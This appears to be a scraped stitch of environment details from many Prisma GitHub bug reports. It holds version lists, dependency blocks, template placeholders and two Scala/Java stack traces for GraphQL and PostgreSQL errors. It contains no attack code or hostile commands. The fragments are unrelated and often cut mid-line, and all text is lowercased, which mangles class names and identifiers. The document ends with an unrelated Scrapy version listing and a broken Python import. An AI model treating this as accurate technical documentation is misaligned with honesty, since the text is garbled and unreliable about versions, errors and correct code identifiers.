- connector: prisma graphql, but occures as well when used with a typescript client - prisma server: - `prisma` replicated on 1.24.0, 1.25-beta, 1.26-alpha - os: osx mojave 10.14.2, prisma as docker on docker 2.0.0.2 - other dependencies: none stacktrace:
prisma_1 | java.util.nosuchelementexception: key not found: street
prisma_1 | at scala.collection.immutable.map$map1.apply(map.scala:108)
prisma_1 | at com.prisma.api.schema.objecttypebuilder.maptooutputresolve(objecttypebuilder.scala:214)
prisma_1 | at com.prisma.api.schema.objecttypebuilder.$anonfun$mapclientfield$1(objecttypebuilder.scala:109)
prisma_1 | at sangria.execution.resolver.resolvefield(resolver.scala:1024)
prisma_1 | at sangria.execution.resolver.$anonfun$collectactionspar$1(resolver.scala:445)
prisma_1 | at scala.collection.traversableonce.$anonfun$foldleft$1(traversableonce.scala:157)
prisma_1 | at scala.collection.traversableonce.$anonfun$foldleft$1$adapted(traversableonce.scala:157)
prisma_1 | at scala.collection.iterator.foreach(iterator.scala:929)
prisma_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma_1 | at scala.collection.traversableonce.foldleft(traversableonce.scala:157)
prisma_1 | at scala.collection.traversableonce.foldleft$(traversableonce.scala:155)
prisma_1 | at scala.collection.abstracttraversable.foldleft(traversable.scala:104)
prisma_1 | at sangria.execution.resolver.collectactionspar(resolver.scala:439)
prisma_1 | at sangria.execution.resolver.resolvevalue(resolver.scala:899)
prisma_1 | at sangria.execution.resolver.resolvevalue(resolver.scala:807)
prisma_1 | at sangria.execution.resolver.$anonfun$resolveactionspar$4(resolver.scala:518)
prisma_1 | at scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)
prisma_1 | at scala.collection.iterator.foreach(iterator.scala:929)
prisma_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma_1 | at scala.collection.traversablelike.map(traversablelike.scala:234)
prisma_1 | at scala.collection.traversablelike.map$(traversablelike.scala:227)
prisma_1 | at scala.collection.abstracttraversable.map(traversable.scala:104)
prisma_1 | at sangria.execution.resolver.resolveactionspar(resolver.scala:512)
prisma_1 | at sangria.execution.resolver.resolvevalue(resolver.scala:901)
prisma_1 | at sangria.execution.resolver.resolvevalue(resolver.scala:807)
prisma_1 | at sangria.execution.resolver.$anonfun$resolveactionspar$13(resolver.scala:609)
prisma_1 | at scala.concurrent.future.$anonfun$flatmap$1(future.scala:302)
prisma_1 | at scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)
prisma_1 | at scala.concurrent.impl.callbackrunnable.run(promise.scala:60)
prisma_1 | at akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)
prisma_1 | at akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)
prisma_1 | at scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)
prisma_1 | at scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)
prisma_1 | at akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)
prisma_1 | at akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)
prisma_1 | at akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)
prisma_1 | at akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)
prisma_1 | at akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)
prisma_1 | at akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)
prisma_1 | at akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)
prisma_1 | {"key":"error/unhandled","requestid":"local:cjr4nehzg00 ","clientid":"contacts_test","payload":{"exception":"java.util.nosuchelementexception: key not found: street","query":"{\ users {\ email\ account {\ name\ address {\ street\ }\ }\ }\ }\ ","variables":"{}","code":"0","stack_trace":"scala.collection.immutable.map$map1.apply(map.scala:108)\\\ com.prisma.api.schema.objecttypebuilder.maptooutputresolve(objecttypebuilder.scala:214)\\\ com.prisma.api.schema.objecttypebuilder.$anonfun$mapclientfield$1(objecttypebuilder.scala:109)\\\ sangria.execution.resolver.resolvefield(resolver.scala:1024)\\\ sangria.execution.resolver.$anonfun$collectactionspar$1(resolver.scala:445)\\\ scala.collection.traversableonce.$anonfun$foldleft$1(traversableonce.scala:157)\\\ scala.collection.traversableonce.$anonfun$foldleft$1$adapted(traversableonce.scala:157)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ scala.collection.traversableonce.foldleft(traversableonce.scala:157)\\\ scala.collection.traversableonce.foldleft$(traversableonce.scala:155)\\\ scala.collection.abstracttraversable.foldleft(traversable.scala:104)\\\ sangria.execution.resolver.collectactionspar(resolver.scala:439)\\\ sangria.execution.resolver.resolvevalue(resolver.scala:899)\\\ sangria.execution.resolver.resolvevalue(resolver.scala:807)\\\ sangria.execution.resolver.$anonfun$resolveactionspar$4(resolver.scala:518)\\\ scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ scala.collection.traversablelike.map(traversablelike.scala:234)\\\ scala.collection.traversablelike.map$(traversablelike.scala:227)\\\ scala.collection.abstracttraversable.map(traversable.scala:104)\\\ sangria.execution.resolver.resolveactionspar(resolver.scala:512)\\\ sangria.execution.resolver.resolvevalue(resolver.scala:901)\\\ sangria.execution.resolver.resolvevalue(resolver.scala:807)\\\ sangria.execution.resolver.$anonfun$resolveactionspar$13(resolver.scala:609)\\\ scala.concurrent.future.$anonfun$flatmap$1(future.scala:302)\\\ scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)\\\ akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)\\\ scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)\\\ scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)\\\ akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)\\\ akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)\\\ akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)\\\ akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)\\\ akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)\\\ akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)\\\ akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)","message":"key not found: street"}}
- connector: mysql - prisma server: `1.24.0` - prisma : `prisma/1.24.0 (darwin-x64) node-v8.10.0` - os: `os x high sierra`
- connector: all - prisma server: 1.24.0 - `prisma` cli: 1.24.0
- connector: n/a (cloud) - prisma server: 1.25-beta-1 (cloud) - os: n/a (cloud) - cli: v1.24.0
- connector: n/a - prisma server: n/a - "prisma": "^1.24.0" - os: elementary os 0.4.1 loki - other dependencies: "prisma-client-lib": "^1.22.2"
- connector: mysql - prisma server: 1.23.2 - `prisma` cli: prisma/1.23.2 (darwin-x64) node-v10.4.0 - os: osx high sierra @divyenduz
- connector: postgres - prisma server: 1.24.0 - `prisma` cli: 1.24.0 - os: arch linux
prisma/1.23.4 (darwin-x64) node-v11.2.0 "dependencies": { "@types/bcrypt": "^3.0.0", "@types/jest": "^23.3.10", "@types/jsonwebtoken": "^8.3.0", "bcrypt": "^3.0.2", "graphql-shield": "^4.1.0", "graphql-yoga": "^1.16.7", "jsonwebtoken": "^8.4.0", "prisma-client-lib": "^1.23.0-test.3" }, "devdependencies": { "apollo-boost": "^0.1.22", "apollo-cache-inmemory": "^1.3.11", "apollo-client": "^2.4.7", "apollo-link-http": "^1.5.7", "graphql": "^14.0.2", "graphql-tag": "^2.10.0", "graphqlgen": "0.4.0", "jest": "^23.6.0", "json-stringify-extended": "^2.0.0", "moment": "^2.22.2", "nodemon": "1.18.7", "ts-jest": "^23.10.5", "ts-node": "^7.0.1", "typescript": "^3.2.1" },
- os: os x high sierra - `prisma` v1.22
- os: macos mojave 10.14.2
- `prisma` cli: prisma/1.23.2 (darwin-x64) node-v10.15.0
- prisma server: prismagraphql/prisma:1.22
- `prisma-client-lib`: 1.23.2
- database: postgresql 11.1
- os: os x mojave - `prisma` cli: prisma/1.23.2 (darwin-x64) node-v8.11.2 dep files:
[gopkg.zip](
- os: `os x high sierra` - `prisma` cli: `prisma@1.23.2 node-v10.12.0`
prisma/1.23.2 (darwin-x64) node-v10.14.2
- os: `macos 10.14.2 (18c54)` - `prisma` cli: `prisma/1.23.2 (darwin-x64) node-v10.13.0` - prisma server: `1.23.2`
- os: this is in docker so should work on any os.
- os: `windows 10` - `prisma` cli: `prisma/1.23.2 (windows-x64) node-v8.11.3` - prisma server: [e.g
- os: macos mojave - `prisma` cli: prisma/1.23.1 (darwin-x64) node-v11.0.0 - prisma server: i don't know how to check prisma server version.
`windows 10`, `os x high sierra`, `ubuntu 16.04`] - `prisma` cli: [e.g
`prisma/1.9.0 (darwin-x64) node-v10.4.0`] - prisma server: [e.g
`1.9.0`] - `graphql-cli`, `prisma-binding`, etc
if applicable
- `prisma` cli: prisma/1.22.2 (linux-x64) node-v10.9.0 - prisma server: [e.g
- osx 10.14.2 - prisma/1.22.2 (darwin-x64) node-v11.2.0
- os: os x high sierra - prisma server: 1.22
- os: windows 10 - `prisma` cli 1.22 - prisma server: 1.22
- os: [`os x mojave`] - `prisma` cli: [e.g
`prisma/1.22.2 (darwin-x64) node-v10.8.0`] - prisma server: [e.g
pri - os: os x mojave - `prisma` cli: prisma/1.22.2 (darwin-x64) node-v8.12.0 - prisma server: prismagraphql/prisma:1.22 - postgres
- os: `os x high sierra` - cli: `prisma/1.24.0-alpha.2 (darwin-x64) node-v9.10.1` - prisma server: `prismagraphql/prisma:1.23-alpha`
- os: ubuntu 18.04 - `prisma` cli: `prisma/1.22.1 (linux-x64) node-v11.2.0`] - prisma server: `v1.22` **additional information**
`prisma deploy would still work`
- os: macos mojave 10.14.1 - `prisma` cli: 1.22.0 - prisma server: 1.22 (docker) - `prisma-client-lib`: 1.22.0
- `graphqlgen`: 0.4.0
- `os x high sierra` - `prisma` cli: 1.20.7 - prisma server: 1.19.3 and 1.20.7
- `os` ubuntu 18.04 - `flow` **0.86.0** - `prisma` 1.21.1 - `graphql-cli` 2.16.4 - `prisma-binding` 2.2.8
- os: macos mojave - `prisma` cli: `prisma/1.21.0 (darwin-x64) node-v10.9.0` - prisma server: [e.g
- os: windows 10 with wsl ubuntu 18.04 - `prisma` cli: prisma/1.21.1 (linux-x64) node-v10.13.0 - prisma server: prisma-eu1 (1.22-beta-1) - npm packages "graphql": "^14.0.2", "graphql-tools": "^4.0.3", "prisma-client-lib": "^1.21.0",
"apollo-server": "^2.2.2",
"graphql": "^14.0.2",
"prisma-client-lib": "^1.21.0"
- `os x high sierra` - `prisma` cli: 1.20.7 - prisma server: 1.19.3 and 1.20.7 edit:
client works as expected if the model name is "user".
- os: os x mojave - `prisma` cli: prisma/1.20.7 (darwin-x64) node-v10.9.0
- os: windows 10 - `prisma` cli: cli - prisma server: prismagraphql/prisma:1.20
- os: macos high sierra 10.13.6 - `prisma` cli: prisma/1.19.0 (darwin-x64) node-v10.12.0
- os: macos latest - `prisma` cli: `prisma/1.20.3 (darwin-x64) node 8 lts`] - `graphql-cli`, `prisma-client`, `graphql-yoga`
- os: ubuntu 18.10 - `prisma` cli: prisma/1.20.1 (linux-x64) node-v11.0.0 - prisma server: prismagraphql/prisma:1.20
- `prisma` 1.19.3
- os: macos latest - `prisma` cli: [e.g
`prisma/1.20.1 (darwin-x64) node 8 lts`] - prisma server: [e.g
`prisma/1.20.1`] p.s
i've already look through the issues and couldn't find anything related to this.
- os: macos 10.14 - `prisma` cli: prisma/1.20.1 (darwin-x64) node-v10.11.0 - prisma server: prisma cloud
- os: os x 10.13.6 - prisma/1.20.1 (darwin-x64) node-v8.11.3 any other versions are in the package.json in the repo above
- os: macos mojave
- latest prisma
- os: osx mojave 10.14 (18a391) - prisma/1.22.0-alpha.102 (darwin-x64) node-v10.12.0 - prismagraphql/prisma:1.21-alpha - mongodb 3.6 - golang 1.11
- os: macos mojave - `prisma` cli: 1.20.0 - prisma server: no clue
- `prisma-client-lib`: 1.20.1
- os: centos-release-7-4.1708.el7.centos.x86_64 linux fdcd67765900 3.10.0-514.21.2.el7.x86_64 #1 smp tue jun 20 12:24:47 utc 2017 x86_64 x86_64 x86_64 gnu/linux - graphql: 14.0.2 - graphql-cli: 2.16.5 - graphql-request: 1.8.2 - graphql-tools: 3.0.4 - graphql-yoga: 1.16.2 - log4js: 3.0.5 - prisma: 1.15.3 and test with 1.20.1 - prisma-binding: 2.1.5
- os: [`ubuntu 18.04`] - `prisma` cli: [e.g
`prisma/1.20.0 (x64) node-v10.13.0`] - prisma server: [e.g
`1.20.0`] - `prisma-client/1.20.0`
- `prisma` cli: `prisma/1.20.0 (darwin-x64) node-v10.4.0` - prisma server: `1.20.0`
`windows 10`, `os x high sierra`, `ubuntu 16.04`] - `prisma` cli: [e.g
`prisma/1.9.0 (darwin-x64) node-v10.4.0`] - prisma server: [e.g
`1.9.0`] - `graphql-cli`, `prisma-binding`, `graphql-yoga`, etc
if applicable
os x - `prisma` 1.19.1
- os: latest ubuntu - `prisma` cli: `prisma/1.19.1 (linux-x64) node-v8.10.0` - prisma server: `1.19.1`
- os: macos - `prisma` cli: prisma/1.19.0 (darwin-x64) node-v10.11.0 - prisma server: demo server on prisma cloud - "graphql-yoga": "^1.16.7", "prisma-client-lib": "^1.19.0"
- os: archlinux - `prisma` cli: 1.19 - "graphql": "^0.13.2", - "graphql-yoga": "^1.16.7", - "prisma-client-lib": "^1.19.0"
- `prisma` cli: `prisma/1.20.0-alpha.33 (darwin-x64) node-v10.4.0` - prisma server: `1.18`
- os: macos mojave 10.14
- `prisma` cli: `prisma/1.19.0-beta.8 (darwin-x64) node-v10.4.0`
- os: `windows 10` - prisma cli: [`prisma/1.18.0 node-v8.11.1`] - postgresql: `database version 10.3` **files**
[db.sql.zip](
[mutation_creataarticulo.txt]( @marktani
- `prisma` cli: `prisma/1.19.0-beta.2 (darwin-x64) node-v10.8.0)` - prisma server: `1.18.x`
- os: `os x mojave 10.14` - `prisma` cli: prisma/1.18.0 (darwin-x64) node-v10.10.0`
- prisma/1.18.0 (darwin-x64) node-v10.12.0
- os: `ubuntu 18.04` - `prisma` cli: `prisma@1.19.0-alpha.21` - `docker-image` : `prismagraphql/prisma:1.17.1` - `go-client`
- `go-version` : 1.11.1 linux/amd64
- `prisma` cli: `prisma/1.19.0-beta.2`
- `prisma` cli: [e.g
`prisma/1.18.0 (darwin-x64) node-v10.4.0`]
- os: widnows 10 - prisma/1.17.1 (windows-x64) node-v10.11.0
- os: `os x high sierra` - `prisma` cli: `prisma/1.17.1 (darwin-x64) node-v10.11.0` - prisma server: `1.17.1`
- os: `os x high sierra` - `prisma` cli: `prisma/1.17.1 (darwin-x64) node-v8.11.1` - `graphql-cli` - 2.16.7
- os: `os x high sierra` - `prisma` cli: 1.18 - prisma server: 1.17 - `prisma-client-lib`: 1.17.1
- os: windows 10 - `prisma` cli: `prisma/1.17.1 (windows-x64) node-v10.10.0`
$ lsb_release -a
distributor id: ubuntu
description: ubuntu 18.04.1 lts
release: 18.04
codename: bionic - `prisma` cli: [e.g
`prisma/1.9.0 (darwin-x64) node-v10.4.0`] $ prisma --version
prisma/1.16.2 (linux-x64) node-v8.11.2
- os: os x high sierra 10.13.4 - `prisma` cli: `prisma/1.17.1 (darwin-x64) node-v10.10.0` - prisma server: `1.16.2` - `graphql-yoga`
- `prisma` cli: `prisma/1.17.0 (darwin-x64) node-v10.4.0` - prisma server: [e.g
- os: alpine linux - `prisma` cli: `prisma/1.17.1 node-v10.4.0`
- os: os x high sierra - `prisma` cli: prisma/1.18.0-alpha.3 (darwin-x64) node-v10.5.0 - prisma server: 1.11
- os: os x high sierra - prisma/1.17.0-beta.30 (darwin-x64) node-v10.9.0
- `prisma` cli: `prisma/1.17.0-beta.24 (darwin-x64) node-v10.4.0` - prisma server: `1.17.0-beta`
- os: windows 10` - `prisma/1.17.0-beta.24 (windows-x64) node-v10.7.0`
- os: ubuntu 17.10 - `prisma` cli: prisma/1.16.5 (linux-x64) node-v8.11.3 - prisma server: prisma:1.16 please help.
- prisma server: `1.16.x`
- os: os x - `prisma` cli: `prisma/1.17.0-beta.24 (darwin-x64) node-v10.8.0` - prisma server: `1.17-beta`
- os:`os x high sierra` - prisma cli: `prisma/1.17.0-beta.22 (darwin-x64) node-v10.4.1` for some context - i had a previous version of the prisma cli installed and i upgraded via homebrew
i've tried uninstalling and removing all traces of prisma and then reinstalling but it appears as if the prisma binary isn't compiling properly.
- os: `os x high sierra` - `prisma` cli: `prisma/1.16.0 (darwin-x64) node-v10.4.0` - prisma server: `1.16.0`
- os: os x high sierra - `prisma` cli: prisma/1.17.0-beta.16 (darwin-x64) node-v9.3.0 - "prisma-client-lib": "^0.2.58"
- os: linux archlinux 4.18.5-arch1-1-arch - `prisma` cli: `prisma/1.16 node-v8.11.4` - prisma server: `1.16`
- os: `os x high sierra` - `prisma` cli: 1.16.2 - prisma server: 1.6.2
- db: postgresql 10.5
- prisma server: `1.16.1`
- prisma cli: `prisma/1.17.0-beta.2 (darwin-x64) node-v8.11.4` - prisma server: `1.17-beta-1`
- os: `ubuntu 16.04` - `prisma` cli: `prisma/1.15.3 (linux-x64) node-v8.11.4` - prisma server: `1.15`
prisma server 1.15.3
- os: `windows 10` using docker container - `prisma` cli: `prisma/1.15.3 (x64) node-v10.9.9` - prisma server: `1.15.3`
prisma 1.15.3
- os: windows 10 - `prisma` cli: i don't know what information this is requesting
- prisma server: 1.15 the source server is running on prisma.io
the destination server is a local docker container on windows 10 using the docker-compose generated by `prisma init`
i have tried using both postgres and mysql as back ends, no change.
- os: `os x high sierra` - prisma cli: `1.13.7` - prisma server: `prismagraphql/prisma:1.17-alpha`
- os: `os x high sierra` - `prisma` cli: `prisma/1.4.2 (darwin-x64) node-v10.4.0` - prisma server: `1.13.7`
- `prisma` cli: `prisma/1.15.1 (darwin-x64) node-v10.8.0`
- os: os x high sierra, - cli: prisma/1.15.1, node-v10.4.0 - prisma server: 1.13 - `graphql-cli`, `prisma-binding`, `graphql-yoga`
- os: `os x high sierra` - prisma cli: `prisma/1.14.2 (darwin-x64) node-v8.11.3` - prisma server: demo server
`windows 10`, `os x high sierra`, `ubuntu 16.04`] - `prisma` cli: [e.g
`prisma/1.9.0 (darwin-x64) node-v10.4.0`] - prisma server: [e.g
`1.9.0`] - `graphql-cli`, `prisma-binding`, `graphql-yoga`, etc
if applicable
- os: `os x high sierra` - `prisma` cli: prisma/1.14.2 (darwin-x64) node-v8.11.3 - prisma server: 1.14.2
prisma 1.14.2 with latest postgresql database <details> <summary>** error output **</summary> > \x1b[36mprisma_1 |\x1b[0m [bugsnag - local / testing] error report: com.bugsnag.report@646c63d8
\x1b[36mprisma_1 |\x1b[0m org.postgresql.util.psqlexception: error: missing from-clause entry for table "session_taskgroup_task_alias"
\x1b[36mprisma_1 |\x1b[0m position: 493
\x1b[36mprisma_1 |\x1b[0m at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433)
\x1b[36mprisma_1 |\x1b[0m at org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178)
\x1b[36mprisma_1 |\x1b[0m at org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306)
\x1b[36mprisma_1 |\x1b[0m at org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441)
\x1b[36mprisma_1 |\x1b[0m at org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365)
\x1b[36mprisma_1 |\x1b[0m at org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155)
\x1b[36mprisma_1 |\x1b[0m at org.postgresql.jdbc.pgpreparedstatement.executequery(pgpreparedstatement.java:118)
\x1b[36mprisma_1 |\x1b[0m at com.zaxxer.hikari.pool.proxypreparedstatement.executequery(proxypreparedstatement.java:52)
\x1b[36mprisma_1 |\x1b[0m at com.zaxxer.hikari.pool.hikariproxypreparedstatement.executequery(hikariproxypreparedstatement.java)
\x1b[36mprisma_1 |\x1b[0m at com.prisma.api.connector.jdbc.database.builderbase.$anonfun$querytodbio$1(builderbase.scala:51)
\x1b[36mprisma_1 |\x1b[0m at com.prisma.api.connector.jdbc.database.builderbase.$anonfun$jooqtodbio$1(builderbase.scala:81)
\x1b[36mprisma_1 |\x1b[0m at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)
\x1b[36mprisma_1 |\x1b[0m at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)
\x1b[36mprisma_1 |\x1b[0m at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275)
\x1b[36mprisma_1 |\x1b[0m at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275)
\x1b[36mprisma_1 |\x1b[0m at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
\x1b[36mprisma_1 |\x1b[0m at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
\x1b[36mprisma_1 |\x1b[0m at java.lang.thread.run(thread.java:748) </details>
prisma 1.14.2 with latest postgresql database.
- os: ubuntu 18 - `prisma` cli: n/a - prisma server: 1.14
- prisma server: 1.15-beta-1 (current dev servers) **context**
when either giving the subscription a name or removing the fragments it works just fine (spinning wheel in playground):
fragment postfragment on post{ id
subscription somename{post{node{ ...postfragment }}}
subscription {post{node{ id }}}
- os: `os x high sierra` - `prisma` cli: `prisma/1.9.0 (darwin-x64) node-v8.11.3`
- prisma cli: `prisma/1.14.0 (darwin-x64) node-v10.8.0` - prisma server: `1.14`
- os: amazon linux ecs ami - `prisma` cli: `prisma/1.13.7 (darwin-x64) node-v8.11.1` - prisma server: `1.13.7`
- os: macos high sierra - `prisma` cli: 1.13.7 - prisma server: 1.13.7 (docker image) - `graphql-cli@2.16.4`
- prisma server: [`1.12`, `1.13`]
- os: macos high sierra 10.13.6 - "graphql-yoga": "^1.16.0" - "prisma-binding": "^2.1.4" - "graphql-cli": "^2.16.5" - "prisma": "^1.13.7"
[package.json before and after upgrade]( #7030d0b2f71b999ff89a343de08c414af32fc93a), doesn't work in both cases
**update:**
[here]( is another repository with the same structure and same versions of packages
subscriptions defined identically in both repositories, but in this one they work
also, when i make `console.log(context)` inside the subscription, i get such message: `(node:12649) [dep0079] deprecationwarning: custom inspection function on objects via .inspect() is deprecated` in the first repository but i do not get it in the second repository.
- os: ubuntu 18 - `prisma` cli: prisma/1.6.3 (linux-x64) node-v9.11.1 - prisma server: 1.6? (docker local_prisma-database_1) - `graphql-cli` 2.16.1
- os: macos high sierra 10.13.6 - `prisma` cli: prisma/1.13.7 (darwin-x64) node-v10.8.0 - prisma server: 1.13.7 (docker)
- prisma server: `1.14-beta-1`.
- prisma server: `1.13.4`
- os: [os x mojave] - `prisma` prisma/1.13.6 (darwin-x64) node-v10.8.0
- prisma server: `1.12.x` and `1.14-beta-1`.
prismagraphql/prisma 1.13 358d83735689
postgres 10.4 978b82dc00dc
- os: `macos high sierra 10.13.3` - `prisma` cli: `prisma/1.13.5 (darwin-x64) node-v9.7.1` - prisma server: `1.10.2`
- `prisma` cli: `prisma/1.13.5 (darwin-x64) node-v10.4.1` - prisma server: `1.13.5`
- os: os x high sierra - `prisma` cli: prisma/1.13.4 (darwin-x64) node-v10.8.0 - prisma server: 1.13.4
- os: `fedora 28` - `prisma 1.13.2` first mentioned in #2824.
- os: `ubuntu 18.04 lts` - prisma cli: `prisma/1.14.0-beta (linux-x64) node-v8.11.3` - docker-compose: `docker-compose version 1.22.0, build f46880fe`
- `prisma` cli: `prisma/1.12.0 (darwin-x64) node-v10.4.0` - prisma server: [e.g
- os: `os x high sierra`
- os: macos 10.13.6 (17g65) on safari version 12.0 (13606.1.24.40.1) - `prisma` cli: prisma/1.12.1 (darwin-x64) node-v9.11.2 - prisma server: 1.10.2 (the one from right?)
- os: arch linux 4.17.8-1 - `prisma` cli: prisma/1.12.0 (linux-x64) node-v9.11.1 - prisma server: 1.12.0
- os: os x high sierra - `prisma` cli: prisma/1.12.0 (darwin-x64) node-v10.7.0 - prisma server: 1.12.0
- os: `os x high sierra 10.13.5`, - `prisma` cli: prisma/1.6.3 (darwin-x64) node-v8.11.1 - prisma server: `1.11.1` - `graphql-cli`, `prisma-binding`, `graphql-yoga`, `graphql-tag`, `graphql-tools
- `os`: os x high sierra - prisma: `prisma1.12`
- os: `os x high sierra` - `prisma` cli: `prisma/1.12.0 (darwin-x64) node-v8.9.4` - prisma server: `1.12.0` - `graphql-cli`, `prisma-binding`, `graphql-yoga`, `node-basic-boilerplate`
`windows 10`, `os x high sierra`, `ubuntu 16.04`] - `prisma` cli: [e.g
`prisma/1.9.0 (darwin-x64) node-v10.4.0`] - prisma server: [e.g
`1.9.0`] - `graphql-cli`, `prisma-binding`, `graphql-yoga`, etc
if applicable
- os: `os x high sierra` - `prisma` cli: [e.g
`prisma/1.12.0 node-v8.9.2`] - prisma server: [e.g
`1.12.0`] - `graphql-cli`, `prisma-binding`, `graphql-yoga`
- os: `os x high sierra` - `prisma` cli: prisma/1.12.0 (darwin-x64) node-v10.6.0 - prisma server: `1.12`
- os: amazon linux - prisma 1.11, node: 10.6.0 - prisma server: 1.11
- prisma binding: 2.1.0, graphql-yoga: 1.14.12
- os: `ubuntu 18.04` - `prisma` cli: `prisma/1.11.0 (darwin-x64) node-v10.5.0` - prisma server: `1.11.0`
- `prisma` cli: `prisma/1.11.1 (darwin-x64) node-v10.4.1`
windows 10 home
docker toolbox latest version
![image](
node version 10.4
postgresql 10.1
prisma 1.17.1 **edit: will upload node backend server to my github so that if you test introspecting the existing database that i have in my system, you can try it if it works (or replicate the error)
- prisma server: `1.11.0`
- os: `os x` - prisma: `prisma/1.11.1 (darwin-x64) node-v9.7.1` - prisma server: [e.g
- `prisma` cli: `prisma/1.11.1 (darwin-x64) node-v10.4.0` - prisma server: `1.11`
* will add this information soon.
- os: `windows 10 - `prisma` cli: prisma/1.11.0 - prisma server: 1.11 / 1.10 / 1.9 - connectors : mysql 5.7 , postgres
- os: `os x high sierra` - prisma server: `1.11.0`
- os: `os x high sierra` - `prisma`: `prisma/1.10.2 (darwin-x64) node-v8.5.0` - prisma server: public demo server
- `windows 10` - prisma/1.10.2 (windows-x64) node-v8.9.4 - prisma server: 1.11-beta (heroku) - graphql-cli 2.16.3
- os: `os x high sierra` - `prisma` cli: `prisma/1.10.2 (darwin-x64) node-v10.4.0` - prisma server: `1.10`
- prisma server: `1.10.2`
- os: mac os high sierra 10.13.4 (17e202) / macbook pro (17-inch, early 2011) - `prisma` cli: prisma/1.10.2 (darwin-x64) node-v8.10.0 - prisma server: 1.10 - `graphql-cli v2.16.3`
- os: `ubuntu 18.04 lts` - `prisma` cli: `prisma/1.10.0 (linux-x64) node-v9.11.1` - prisma server: `1.11-beta` (i've also tried `1.10` and `1.9`)
- os: macos high sierra 10.13.5 - `prisma` cli: `prisma/1.9.0 node-v8.11.3`]
- windows 10 - `prisma` cli: [e.g
`prisma/1.9.0 (darwin-x64) node-v10.4.0`] - latest `graphql-import` `0.5.2` - just clone and run it, you'd see the problem, and it you remove the import works fine, so the import is causing problems.
ubuntu 16.04 node --version
v6.11.0 npm --version
scrapy : 2.3.0
lxml : 4.5.2.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.8.2 (default, jul 16 2020, 14:00:26) - [gcc 9.3.0]
pyopenssl : 19.1.0 (openssl 1.1.1f 31 mar 2020)
cryptography : 2.8
platform : linux-5.4.0-7642-generic-x86_64-with-glibc2.29 ### example pipline.py ```python3
from itemadapter import itemadapter
